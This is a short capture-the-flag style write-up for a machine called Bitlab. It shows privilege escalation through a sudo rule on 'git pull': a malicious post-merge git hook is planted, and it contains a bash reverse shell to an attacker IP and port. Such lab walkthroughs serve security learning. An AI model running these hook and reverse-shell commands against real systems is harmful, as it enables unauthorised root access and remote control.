# Alternative way to exploit Bitlab

## Privilege Escalation

As the _index.php_ showed, the user _www-data_ has sudo permissions to run `git pull` as root:
```
sudo -l
```
```
User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
```

With **Git Hooks** it is possible to trigger actions at certain points in gits execution.
More about this can be found in the `man` page:
```
man githooks
```

The hook _post-merge_ is invoked by `git merge`, which happens when a `git pull` is done on a local repository.
So when editing the hook, running the _post-merge_ command and then run a sudo command, it will run commands as root.

Copying the _profile_ directory to _/dev/shm_ as _www-data_ has no write access to it:
```
cp -r /var/www/html/profile/ /dev/shm/

cd /dev/shm/profile
```

Creating the hook in the _./git/hooks_ directory:
```
vim .git/hooks/post-merge

chmod +x post-merge
```

The code in the new _post-merge_ file is a bash reverse shell:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.10/9002 0>&1'
```

When running `sudo git pull`, it will tell that the repository is up to date.
To run the command, the repository needs to have pending changes and this can be accomplished by creating a file on the **GitLab** on the _Profile_ repository and then merge the branches.

After creating a file, the command can be run with sudo privileges:
```
cd /dev/shm/profile

sudo git pull
```

The reverse shell command in _post-merge_ will also execute and the listener on my IP and port 9002 start a reverse shell session as root!
